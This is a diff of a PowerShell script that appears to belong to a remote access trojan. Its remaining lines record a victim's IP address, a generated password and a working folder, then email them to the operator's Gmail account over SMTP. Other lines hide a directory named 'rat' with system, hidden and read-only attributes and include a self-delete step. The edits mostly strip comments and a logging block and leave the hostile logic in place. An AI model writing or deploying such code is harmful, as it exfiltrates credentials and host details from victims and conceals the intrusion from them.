@@ -43,8 +43,6 @@ Add-Content -Path $user_name -Value $target_ip
 Add-Content -Path $user_name -Value $pass_gen_string
 Add-Content -Path $user_name -Value $temp_folder_path
 
-##################
-
 # Define email parameters
 $EmailFrom = $your_email 
 $EmailTo = $your_email 
@@ -53,31 +51,16 @@ $Body = "$user_name"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = 587
 
-# Create the SMTP client
 $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
 $SMTPClient.EnableSsl = $true
-
-# Set credentials securely
 $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($your_email, $email_password)
 
-# Create the email message
 $MailMessage = New-Object System.Net.Mail.MailMessage
 $MailMessage.From = $EmailFrom
 $MailMessage.To.Add($EmailTo)
 $MailMessage.Subject = $Subject
 $MailMessage.Body = $Body
-
-# Define file path for saving results (Desktop folder)
-$DesktopPath = $temp_folder_path
-$LogFilePath = Join-Path -Path $DesktopPath -ChildPath "EmailLog.txt"
-
-# Send the email and log results
 $SMTPClient.Send($MailMessage)
-
-# Write result to file
-$Result | Out-File -FilePath $LogFilePath -Append -Encoding UTF8
-##################
-
 
 # goto temp, make working directory
 mkdir $temp_folder_path
@@ -105,7 +88,7 @@ Set-Location C:\Users
 attrib +h +s +r rat
 
 # self delete
-Set-Location $current_dir
+Set-Location $temp_folder_path
 
 $file_content = @"
 Target IP Address: $target_ip
